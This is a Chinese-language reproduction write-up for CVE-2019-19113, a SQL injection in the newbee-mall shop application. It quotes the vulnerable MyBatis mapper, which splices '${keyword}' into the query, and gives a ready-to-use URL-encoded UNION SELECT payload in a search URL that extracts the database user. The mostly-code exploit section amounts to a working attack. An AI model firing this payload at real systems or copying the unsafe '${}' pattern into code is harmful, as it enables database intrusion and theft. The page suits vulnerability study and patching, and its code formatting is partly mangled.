# CVE-2019-19113）Newbee-mall新蜂商城sql注入

> 原文：[https://www.zhihuifly.com/t/topic/3037](https://www.zhihuifly.com/t/topic/3037)

# （CVE-2019-19113）新蜂商城sql注入

## 一、漏洞简介

newbee-mall 2019-10-23之前版本中的main/resources/mapper/NewBeeMallGoodsMapper.xml文件存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。

## 二、漏洞影响

Newbee-mall 2019-10-23之前版

## 三、复现过程

\src\main\resources\mapper\NewBeeMallGoodsMapper.xml

```
 <select id="findNewBeeMallGoodsListBySearch" parameterType="Map" resultMap="BaseResultMap">
        select
        <include refid="Base_Column_List"/>
        from tb_newbee_mall_goods_info
        <where>
            <if test="keyword!=null and keyword!=''">
                and (goods_name like CONCAT('%','${keyword}','%') or goods_intro like CONCAT('%','${keyword}','%'))
            </if>
            <if test="goodsCategoryId!=null and goodsCategoryId!=''">
                and goods_category_id = #{goodsCategoryId}
            </if>
        </where>
        <if test="orderBy!=null and orderBy!=''">
            <choose>
                <when test="orderBy == 'new'">

```
 order by goods_id desc
            &lt;/when&gt;
            &lt;when test="orderBy == 'price'"&gt;

                order by selling_price asc
            &lt;/when&gt;
            &lt;otherwise&gt;

                order by stock_num desc
            &lt;/otherwise&gt;
        &lt;/choose&gt;
    &lt;/if&gt;
    &lt;if test="start!=null and limit!=null"&gt;
        limit #{start},#{limit}
    &lt;/if&gt;
&lt;/select&gt; 
``` 
```

如果使用$ {keyword}拼接sql语句，则存在SQL注入的风险

poc：

```
http://0-sec.org:28089/search?goodsCategoryId=&keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&orderBy=default 
```